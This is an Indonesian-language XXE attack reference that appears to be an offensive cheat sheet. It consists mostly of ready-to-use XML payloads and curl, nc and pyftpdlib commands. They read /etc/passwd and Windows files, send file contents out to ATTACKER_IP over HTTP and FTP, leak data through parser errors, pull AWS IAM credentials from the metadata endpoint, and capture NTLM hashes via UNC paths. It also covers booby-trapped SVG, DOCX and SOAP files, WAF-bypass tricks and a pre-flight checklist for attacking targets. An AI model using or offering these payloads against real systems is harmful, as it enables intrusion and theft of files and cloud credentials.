# xxe — web

# XXE: Referensi Teknik Lengkap

## 1. Klasik — File Read In-Band

**Apa yang dikirim** (application/xml ke parser libxml2/PHP `DOMDocument`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

**Harness:**

```bash
curl -s -X POST http://TARGET/api/xml \
  -H 'Content-Type: application/xml' \
  --data-binary @payload.xml
```

**Apa yang muncul:** isi `/etc/passwd` inline di body respons. **Kenapa berhasil:** `libxml2 <2.9.0` default `resolve_externals=1`, PHP `<8.0` tidak set `LIBXML_NOENT` tapi entity tetap di-expand bila `LIBXML_DTDLOAD` aktif via wrapper. **Kenapa gagal:** `libxml2 >=2.9.0` (Apr 2013) tidak load external entity kecuali `LIBXML_NOENT|LIBXML_DTDLOAD`; PHP 8.0+ default `libxml_disable_entity_loader(true)`. cURL/Java JAXP `DocumentBuilderFactory` default `disallow-doctype-decl=false` sampai JDK 9, setelahnya tetap `false` tapi `FEATURE_SECURE_PROCESSING` di beberapa framework.

Windows 11 24H2 target, payload path:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<foo>&xxe;</foo>
```

## 2. File Read per OS — Path Presisi

| OS | Payload ENTITY | Catatan |
|---|---|---|
| Linux | `file:///etc/passwd` | world-readable. `/etc/shadow` gagal (perm 640 root). |
| Linux | `file:///proc/self/environ` | sering berisi `HTTP_USER_AGENT`, secret env di container. |
| Linux | `file:///proc/self/cmdline` | null-separated, parser bisa truncate. |
| Linux | `file:///etc/hostname`, `file:///proc/self/cgroup` | fingerprint container/k8s. |
| Windows | `file:///C:/Windows/win.ini` | selalu ada, UTF-16LE untuk `C:/Windows/System32/...` di beberapa versi. |
| Windows | `file:///C:/Windows/System32/drivers/etc/hosts` | world-readable. |
| Windows | `file:///C:/inetpub/wwwroot/web.config` | bila IIS; berisi connection string. |
| Windows | `file:///\\\\attacker\\share\\x` | UNC → SMB outbound (lihat §5). |
| macOS | `file:///etc/passwd`, `file:///Library/Preferences/...` | SIP membatasi `/System`. |

**Detik null-byte / encoding:** `file:///etc/passwd%00.png` berhasil di PHP `<5.3.4` (CVE-2006-7243 fixed). Setelah itu literal.

**Batas ukuran:** libxml2 `XML_MAX_TEXT_LENGTH` default 10 MB; entity >10 MB gagal `XML_ERR_ENTITY_LOOP` atau truncate. `/etc/passwd` aman, `/var/log/syslog` set >10 MB gagal.

## 3. Blind OOB — Parameter Entity + HTTP/FTP Exfil

**Kenapa butuh OOB:** respons endpoint tidak echo, atau parser reflection dimatikan tapi external fetch tetap aktif.

### 3a. HTTP exfil (paling portabel)

Attacker host `ATTACKER_IP` listen `nc -lvnp 8000`. Kirim:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
  %eval;
  %exfil;
]>
<foo>bar</foo>
```

**Apa yang muncul di listener:**

```
GET /?d=root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...
```

**Kenapa berhasil:** `%file` di-expand sebagai parameter entity dalam definisi `%exfil`; URI percent-encoding dilakukan parser saat fetching. **Kenapa gagal:** (1) `%file` berisi newline → URI malformed, parser abort. Workaround split per baris pakai `ftp://` atau PHP filter `php://filter/convert.base64-encode/resource=` untuk file biner/multiline. (2) `libxml2` menolak parameter entity di dalam definisi internal subset bila `XML_PARSE_NOENT` — sebagian parser hanya expand PE dalam external DTD.

### 3b. FTP exfil (multi-line safe)

Kirim:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER_IP:2121/%file;'>">
  %eval;
  %exfil;
]>
```

Listener:

```bash
python3 -m pyftpdlib -p 2121 -i 0.0.0.0
```

**Apa yang muncul:** `USER anonymous`, `PASS root:x:0:0:...` — isi file jadi kredensial FTP; newline ter-encode `%0a` di USER jika parser pakai `xmlURIEscapeStr`. **Kenapa gagal:** outbound FTP sering diblokir egress firewall; XML parser baru (libxml2 ≥2.9.x) meng-escape `%0a` sehingga FTP server reject `USER` dengan newline → log tetap menangkapnya di `USER`.

### 3c. Nested parameter entity (multiline HTTP)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
  %eval;
  %exfil;
]>
```

Base64 hilangkan newline → satu GET. **Syarat:** `allow_url_fopen=On`, PHP wrapper `php://filter` enabled, atau `expect://` tidak relevan di sini.

## 4. Error-Based XXE

Tidak perlu respons echo, tidak perlu OOB egress. Parser melaporkan error yang menyertakan isi file.

**Payload (dyanlysis / Java SAX):**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %exfil;
]>
<foo/>
```

**Apa yang muncul di respons error:**

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Kenapa berhasil:** `FileNotFoundException` menyertakan path yang di-attempt = path + isi file (karena `%file` di-expand sebelum fetch). **Kenapa gagal:** framework mem-suppress stack trace (`<error-page>` default di Spring Boot; `customErrors=On` di .NET). Juga file dengan `:` di Windows → path invalid sebelum error throw. Windows payload:

```xml
<!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///C:/nonexistent/%file;'>">
```

`:` di `/C:/nonexistent/C:\Windows\...` sering memicu `IllegalArgumentException` yang tetap leak.

**PHP error-based (DOMDocument):**

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'http://%file;'>">
  %error;
  %exfil;
]>
```

Error: `failed to load external entity "http://cm9vdDp4OjA6..."` → base64 di pesan.

## 5. SSRF via XXE

XXE adalah SSRF primitif: entity `SYSTEM` bisa menunjuk `http://`, `https://`, `ftp://`, `gopher://` (jarang), dan `file://`.

**Internal probe (AWS IMDSv1):**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&xxe;</foo>
```

**Apa yang muncul:** nama role, mis. `ec2-instance-role`. Lanjut:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role">
```

Respons berisi `AccessKeyId`, `SecretAccessKey`, `Token`. **Kenapa berhasil:** parser mengikuti redirect dan mengembalikan body ke entity. **Kenapa gagal:** IMDSv2 wajib `PUT /latest/api/token` header `X-aws-ec2-metadata-token` — XXE tidak bisa set header kecuali via `gopher://` (butuh parser yang izinkan gopher; libxml2 tidak). Egress ke 169.254.169.254 diblokir di Fargate/EKS IRSA.

**Internal service probe + method confusion:**

```xml
<!ENTITY xxe SYSTEM "http://internal-redis:6379/">  <!-- GET, Redis inline command? -->
<!ENTITY xxe SYSTEM "http://internal-admin:8080/actuator/env">
```

**Port scan (timing/error oracle):** bedakan `Connection refused` (closed) vs `timeout` (filtered) vs `XML_ERR` beda (open non-HTTP). libxml2 error code `XML_IO_LOAD_ERROR` untuk semua close/refuse; gunakan wall-clock.

**Windows UNC → SMB relay:**

```xml
<!ENTITY xxe SYSTEM "file://\\\\ATTACKER_IP\\share\\x">
```

Windows 11 24H2 default blokir SMB1 inbound, SMB signing default required di 24H2 (sejak 24H2 build 26100 berlaku untuk semua). Relay NTLM ke host non-signing masih jalan; netexec/responder log `NTLMv2-SSP` hash.

## 6. XXE di Format Berkas (Bukan XML Murni)

### 6a. SVG

Upload `avatar.svg`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Apa yang muncul:** `hostname` render di dalam SVG bila parser ImageMagick/Inkscape/librsvg atau backend `svg2png` memproses entity. `librsvg <2.52` rentan; `librsvg >=2.52` set `XML_PARSE_NOENT` off. Chrome 131 renderer SVG **tidak** resolve external entity (spec). Server-side rasterizer (ImageMagick `MVG`/`MSL`, `rsvg-convert`) yang jadi target.

**Harness upload:**

```bash
curl -X POST http://TARGET/upload -F 'file=@payload.svg;type=image/svg+xml'
```

### 6b. DOCX / XLSX / PPTX (OOXML)

ZIP berisi `word/document.xml`, `xl/workbook.xml`, `[Content_Types].xml`. Inject DTD di XML pertama yang diparse.

**DOCX minimal exploit:**

```bash
mkdir -p docx/word docx/_rels
cat > docx/word/document.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
EOF
# plus [Content_Types].xml dan _rels/.rels minimal
cd docx && zip -r ../payload.docx .
```

**Apa yang muncul:** bila backend menggunakan library `python-docx` (lxml `resolve_entities=True` default di lxml <5.0; lxml 5.0 tetap default `resolve_entities=True` kecuali `parser=XMLParser(resolve_entities=False)`), isi `/etc/passwd` masuk ke model dan sering muncul di preview/log. **Kenapa gagal:** Word desktop modern (Office 365, Word 2019+) parse OOXML dengan `MSXML` hardened yang **tidak** resolve external DTD; exploit efektif hanya terhadap backend server-side converter (LibreOffice `<7.4`, docx4j `<11`, Apache POI `<5.2` untuk beberapa parser). LibreOffice 7.4+ (2022) set `DisableEntity` default.

**XLSX variant:** inject ke `xl/sharedStrings.xml` — lebih sering di-parse penuh oleh POI `XSSFWorkbook`.

### 6c. SOAP / WSDL

**SOAP 1.1 request:**

```http
POST /ws/UserService HTTP/1.1
Host: TARGET
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUser"

<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

**WSDL import chain (sering luput):** parser WSDL (`wsdl2java`, .NET `wsdl.exe`, `zeep`) fetch `<import location="...">`. Kirim WSDL ke endpoint yang menerima WSDL upload/URL:

```xml
<?xml version="1.0"?>
<!DOCTYPE definitions [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<definitions xmlns="http://schemas.xmlsoap.org/wsdl/">
  <documentation>&xxe;</documentation>
</definitions>
```

**Kenapa berhasil:** Apache CXF `<3.2.14`/`<3.4.7`/`<3.5.3` (CVE-2022-46364 SSRF via WSDL, tidak persis XXE tapi satu keluarga), JAX-WS RI `<2.3.4` parse WSDL via SAX dengan `external-general-entities=true` default. **Kenapa gagal:** CXF 3.5.4+ (Nov 2022), JAX-WS 4.0 (2023) set `DOCTYPE` disallow.

## 7. Bypass Filter Entity

### 7a. Filter menghapus string `<!ENTITY` / `SYSTEM`

**Bypass via external DTD (DOCTYPE ke attacker):**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER_IP:8000/evil.dtd">
<foo>&xxe;</foo>
```

`evil.dtd` di attacker:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

**Kenapa berhasil:** filter hanya scan body XML; DTD di-fetch runtime. **Kenapa gagal:** WAF modern (Cloudflare, AWS WAF Managed Rules) memblokir `DOCTYPE` dengan `SYSTEM` ke external URI (rule `xxe` CRS 944). AWS WAF `AWSManagedRulesKnownBadInputsRuleSet` blokir `<!DOCTYPE`. **Bypass AWS WAF:** encode DOCTYPE sebagai `&#60;!DOCTYPE` — gagal karena XML spec wajib literal `<!DOCTYPE`. Tidak ada bypass encoding di DOCTYPE.

### 7b. Filter `SYSTEM` keyword

Ganti ke `PUBLIC`:

```xml
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//x//y" "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

`PUBLIC` mengambil dua parameter; parser pakai URI kedua. **Kenapa gagal:** sebagian parser (`libxml2`) memperlakukan PUBLIC ident sama dengan SYSTEM untuk file; tapi bila filter memblokir `file:` juga, tidak menolong.

### 7c. Filter `file:` scheme

UTF-16 encoded body:

```bash
iconv -f UTF-8 -t UTF-16LE payload.xml > payload16.xml
curl -X POST http://TARGET/api/xml \
  -H 'Content-Type: application/xml; charset=utf-16' \
  --data-binary @payload16.xml
```

**Kenapa:** WAF sering match ASCII; parser libxml2 mendeteksi BOM `FF FE` dan decode UTF-16, `file:` terbentuk setelah decode. **Kenapa gagal:** WAF modern decode UTF-16 (CRS 901). Endpoint harus horn `charset` yang cocok; Spring `MappingJackson2XmlHttpMessageConverter` reset ke UTF-8 bila tidak deklarasikan.

### 7d. Filter `<!DOCTYPE` dan DOCTYPE-less attack

XInclude — tidak butuh DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Kenapa berhasil:** `libxml2` XInclude default `enabled` di `xmlXIncludeProcess`; Java `DocumentBuilderFactory.setXIncludeAware(true)` default **false** di JAXP, jadi hanya jalan bila developer enable. Spring `Marshaller` tidak enable → gagal. **Syarat konkret:** parser memanggil `xmlXIncludeProcess` — PHP `DOMDocument::xinclude()` eksplisit; banyak custom code tidak.

### 7e. SVG XInclude

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</svg>
```

Sama: hanya bila rasterizer panggil XInclude.

### 7f. Filter blokir `ENTITY` tapi lupa parameter entity `%`

Sudah dicakup di §3 — `%` PE dan `%eval` bypass filter tag-based.

## 8. DOCTYPE-Less Attack — Tabel

| Teknik | Payload inti | Parser yang jalan | Parser yang gagal |
|---|---|---|---|
| XInclude | `<xi:include href="file:///" parse="text"/>` | libxml2 (via `xmlXIncludeProcess`), PHP `DOMDocument::xinclude()` | JAXP default, XMLBeans, .NET `XmlDocument` |
| XSLT `document()` | `<xsl:value-of select="document('file:///etc/passwd')"/>` | Xalan, Saxon (di XSLT 1.0/2.0) | Saxon 9+ blokir `document()` untuk file URL by default (`-feature:http://saxon.sf.net/feature/allow-external-functions=false`) |
| SSRF via external schema | `<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://ATTACKER/x.xsd">` | parser dengan `schema validation=true` | jarang — schemaLocation adalah hint, dipakai hanya bila validation aktif |
| `xml-stylesheet` PI | `<?xml-stylesheet href="http://ATTACKER/x.xsl"?>` | browser saat render (Chrome 131 blokir cross-origin `file:`), XSLT processor server-side | tidak ada XSLT processor = no-op |
| Parameter entity tanpa DOCTYPE | tidak mungkin — PE hanya dideklarasi dalam DOCTYPE | — | — |

**XSLT DOCTYPE-less exfil (jika processor jalan):**

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://ATTACKER_IP:8000/x.xsl"?>
<foo/>
```

`x.xsl`:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Jalur ini realita di reporting engine (JasperReports `<6.19` default `net.sf.jasperreports.xpath.executer.factory` pakai JAXP dengan `document()` diizinkan), BIRT, dan fop yang memproses XSL-FO.

## 9. Payload Persis — Siap Pakai

### Linux multiline → FTP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://10.0.0.5:2121/%file;'>">
  %eval;
  %exfil;
]>
<foo/>
```

### Windows base64 → HTTP (via .NET filter)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.0.5:8000/?d=%file;'>">
  %eval;
  %exfil;
]>
<foo/>
```

`.NET` `XmlDocument.XmlResolver` default `null` sejak .NET Framework 4.5.2 (2014) — payload ini **gagal** di runtime target kecuali kode set `XmlResolver = new XmlUrlResolver()`. Target realistis: Java SAX/DOM/StAX, PHP `<8.0` dengan `libxml_disable_entity_loader(false)`, Python `lxml <5.0` default, `xml.dom.minidom` (resolves entities tapi tidak external DTD by default — butuh `DOMEntity` handling manual, biasanya gagal), Ruby `REXML <3.2.5` (CVE-2021-28965-related), `Nokogiri` default `NOENT` off.

### Error-based SAX Java

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %exfil;
]>
<foo/>
```

## 10. Jebakan Operasional Lapangan

| Gejala | Root cause | Angka/fakta konkret |
|---|---|---|
| `/etc/passwd` kosong/error, payload lain jalan | `libxml2 >=2.9.0` default `XML_PARSE_NOENT` off, tapi entity expand bisa jalan bila `LIBXML_DTDLOAD` di-set framework | PHP 8.0+ `libxml_disable_entity_loader` deprecated; butuh `LIBXML_NOENT|LIBXML_DTDLOAD` eksplisit. Cek: `php -r 'var_dump(LIBXML_DTDLOAD);'` |
| External DTD ke attacker tidak fetch | parser blokir external DTD tapi tidak blokir internal | `libxml2` `XML_PARSE_NONET` blokir network — set di banyak framework (Spring `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd",false)`). Cek dengan internal entity `<!ENTITY xxe "test">` — bila expand tapi external fetch mati = NONET. |
| FTP exfil `USER anonymous` kosong | newline dalam `%file` di-escape jadi `%0a` dan server reject | `pyftpdlib` default reject `USER` dengan `%`. Pakai `FileRecv`/`pyftpdlib --auth=anonymous` dan grep log raw bytes, atau pakai raw socket `socat TCP-LISTEN:2121,fork -` untuk tangkap raw. |
| HTTP exfil truncate di 4 KB | header line limit nginx `large_client_header_buffers` 4×8 KB, atau apache `LimitRequestLine` 8190 | `/etc/passwd` ~1–3 KB aman. `/proc/self/environ` bisa > 8 KB → split per property atau base64. |
| Blind payload tidak trigger padahal klasik trigger | `string(//...)` salah, entity di attribute tidak di-expand | PE hanya di-expand **di antara markup** internal subset, tidak di attribute value. `<!ENTITY % x "&file;">` legal; `<!ATTLIST a b CDATA "&xxe;">` legal tapi `&xxe;` general entity di attribute kadang di-block. |
| Java target 17+ tidak vulnerable padahal class lama | JAXP 1.6+ (`DocumentBuilderFactory`) set `FEATURE_SECURE_PROCESSING=true` default sejak JDK 13 untuk **beberapa** provider; `disallow-doctype-decl` **tidak** default true (masih `false`) | Uji: `DocumentBuilderFactory.newInstance().getFeature("http://apache.org/xml/features/disallow-doctype-decl")` return `false` di Xerces default untuk JDK 21 (Temurin). Tetap vulnerable bila entity resolver tidak ditutup. |
| Chrome 131 render SVG, tidak trigger | browser blokir `file://` dari origin `https://`/`http://` | server-side rasterizer yang jadi target; jangan upload SVG ke preview frontend, cari endpoint `POST /api/render` / thumbnail generator |
| DOCX tidak trigger di Word desktop | Word 2016+ pakai `MSXML6` dengan `prohibit-dtd=true` hardcoded untuk OOXML | trigger hanya di server-side: LibreOffice `<-7.3`, Python `python-docx` dengan `lxml <5.0` (`resolve_entities=True` default), Apache POI `<5.2.0` |
| WAF blokir semua | CRS 944100 (XXE) match `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `PUBLIC` | bypass minimal: external DTD reference saja (`<!DOCTYPE foo SYSTEM "http://a/b.dtd">` sering lolos CRS 944 karena hanya match `<!ENTITY SYSTEM`); body XML dengan `Content-Type: application/xml` tapi WAF whitelist `text/xml` |
| Outbound diblokir total | egress filter | fallback error-based (§4) — tidak butuh outbound, hanya butuh error reflection. Kalau error suppressed → third-party interaction (DNS via OOB `file://` tidak mungkin tanpa resolver, jadi cari SSRF via XXE §5 internal) |
| `php://filter` tidak jalan | `allow_url_fopen=Off` | filter `php://` tetap jalan walau `allow_url_fopen=Off` untuk `php://filter` (khusus, tidak untuk `php://input`). Bila `open_basedir` set, `/etc/passwd` di luar `open_basedir` = `PHP Warning: failed to open stream: operation not permitted` — error-based masih bisa leak **path**, bukan isi. |
| Angka versi: libxml2 | 2.9.0 (Apr 2013) fix entity default; **2.9.14** (Mei 2022) fix CVE-2022-29824 int overflow di `xmlBuf`; **2.12.x** hardening PE di external subset | target effective ≤ 2.9.13 untuk sebagian besar teknik |
| Angka versi: lxml | 5.0 (Jan 2024) tetap `resolve_entities=True` default — perubahan besar ada di 4.9 (2022) yang tidak menambah hardening; 5.2 tambah `huge_tree` warning | Python target dengan `lxml<5.0` = reliable |
| Angka versi: .NET | Framework 4.5.2 (2014) `XmlDocument.XmlResolver=null`; .NET Core 3.0+ `XmlReaderSettings.DtdProcessing=Prohibit` default **hanya** bila `XmlReader.Create(string)` dipakai — `XmlReader.Create(Stream)` juga `Prohibit` default | target `XmlDocument` manual `XmlResolver = new XmlUrlResolver()` = vulnerable masih |
| Port 8000 firewall | `nc` di attacker bind 0.0.0.0, tapi corporate egress blokir port nonstandard | pakai 80/443 di attacker (`socat TCP-LISTEN:443,reuseaddr,fork`, `python3 -m http.server 443` dengan TLS via `openssl s_server`) |

### Checklist pre-flight sebelum kirim payload

1. Deteksi parser: kirim `<?xml version="1.0"?><a>&undefined;</a>` → error message mengandung nama library (`libxml2`, `xerces`, `expat`, `System.Xml`).
2. Cek reflection: kirim `<!DOCTYPE foo [<!ENTITY t "OK123">]><foo>&t;</foo>` → body berisi `OK123` = inline workspace.
3. Cek external fetch: `<!DOCTYPE foo [<!ENTITY t SYSTEM "http://ATTACKER/ping">]><foo>&t;</foo>` + `nc` → ada GET = OOB feasible.
4. Cek charset: kirim UTF-16 BOM → bila response OK, endpoint parser UTF-16-aware.
5. Baru pilih teknik sesuai matriks: inline kanal terbuka? OOB egress? error visible? external entity resolver aktif?

---

## [reasoning trace]


